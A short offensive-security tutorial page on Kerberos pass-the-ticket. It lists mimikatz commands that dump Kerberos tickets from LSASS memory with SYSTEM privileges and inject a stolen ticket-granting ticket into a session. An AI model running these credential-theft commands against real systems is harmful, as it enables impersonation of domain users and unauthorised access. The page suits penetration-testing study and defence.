# Pass-the-Ticket (Kerberos)

This method aims to extract Kerberos tickets and session keys from LSASS memory using mimikatz. This process will usually require us to have _**SYSTEM**_ privileges on the machine.

We will start off with using mimikatz to extract all the Kerberos tickets present on the local machine:

```
mimikatz # privilege::debug

mimikatz # sekurlsa::tickets /export
```

While mimikatz can extract both the Ticket Granting Ticket (TGT) and Ticket Granting Service (TGS) available in the memory, we will mostly be interested in the TGTs as it allows us request to access to any service that our stolen user is allowed to access.

Once we have obtained our desired ticket (from the command shown above), we can inject the tickets into the current session:

{% code overflow="wrap" %}
```
mimikatz # kerberos::ptt xxxx@test.domain.kirbi
```
{% endcode %}

After running the command, we should retrieve a command prompt session with the injected ticket:

```
C:\> 
```

